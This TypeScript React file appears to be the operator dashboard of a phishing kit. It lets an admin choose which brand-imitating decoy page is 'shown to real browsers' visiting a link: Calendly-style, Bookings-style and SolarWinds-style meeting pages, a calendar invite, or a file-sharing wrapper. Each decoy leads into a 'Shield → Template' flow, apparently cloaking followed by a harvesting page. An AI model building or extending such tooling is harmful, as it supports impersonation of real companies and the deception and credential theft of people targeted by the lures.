import React, { useState, useEffect } from 'react';
import type { PageDesign } from '../types';

interface DecoysPanelProps {
  storedPassword: string;
}

interface DecoyInfo {
  id: PageDesign;
  name: string;
  description: string;
  color: string;
  icon: string;
}

const DECOYS: DecoyInfo[] = [
  { id: 'secureshare', name: 'SecureShare', description: 'Enterprise file sharing wrapper (original)', color: '#2b6cb0', icon: '🔐' },
  { id: 'calendar-invite', name: 'Calendar Invite', description: 'Calendar meeting invite', color: '#5B5FC7', icon: '📅' },
  { id: 'calendly-meeting', name: 'Calendly Meeting', description: 'Calendly-style 10 minute meeting scheduler', color: '#006BFF', icon: '📆' },
  { id: 'bookings-meeting', name: 'Bookings Meeting', description: 'Booking-style scheduling page', color: '#0078d4', icon: '📋' },
  { id: 'solarwinds-meeting', name: 'SolarWinds Meeting', description: 'SolarWinds-style meeting booking page', color: '#F58220', icon: '☀️' },
];

export function DecoysPanel({ storedPassword }: DecoysPanelProps): React.ReactElement {
  const [activeDecoy, setActiveDecoy] = useState<PageDesign>('bookings-meeting');
  const [saving, setSaving] = useState(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => { loadConfig(); }, []);

  async function loadConfig(): Promise<void> {
    setLoading(true);
    try {
      const res = await fetch('/api/templates', { headers: { 'X-Admin-Password': storedPassword } });
      if (res.ok) {
        const data = await res.json() as { template?: string; decoy?: string };
        setActiveDecoy((data.decoy || 'bookings-meeting') as PageDesign);
      }
    } catch { /* defaults */ }
    setLoading(false);
  }

  async function handleActivate(decoyId: PageDesign): Promise<void> {
    setSaving(true);
    try {
      const res = await fetch('/api/templates', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Admin-Password': storedPassword },
        body: JSON.stringify({ decoy: decoyId }),
      });
      const data = await res.json() as { success: boolean };
      if (data.success) setActiveDecoy(decoyId);
    } catch { /* ignore */ }
    setSaving(false);
  }

  if (loading) {
    return <div className="dash-loading"><div className="dash-spinner" /><span>Loading decoys...</span></div>;
  }

  return (
    <div className="tpl-panel">
      <p style={{ fontSize: 14, color: '#a0a0b0', marginBottom: 20 }}>
        Select the decoy page shown to real browsers when they visit the link. Each decoy leads to the same Shield → Template flow.
      </p>
      <div className="tpl-grid">
        {DECOYS.map(d => {
          const isActive = activeDecoy === d.id;
          return (
            <div
              key={d.id}
              className={'tpl-card' + (isActive ? ' tpl-active' : '')}
              onClick={() => !isActive && !saving && handleActivate(d.id)}
              style={{ cursor: isActive ? 'default' : 'pointer' }}
            >
              <div className="tpl-card-top">
                <div className="tpl-icon" style={{ background: d.color }}>{d.icon}</div>
                <div className="tpl-info">
                  <div className="tpl-name">{d.name}</div>
                  <div className="tpl-desc">{d.description}</div>
                </div>
              </div>
              <div className="tpl-card-bottom">
                <span className="tpl-id">{d.id}</span>
                <span className={'tpl-badge' + (isActive ? ' active' : ' inactive')}>
                  {isActive ? 'Active' : 'Inactive'}
                </span>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}
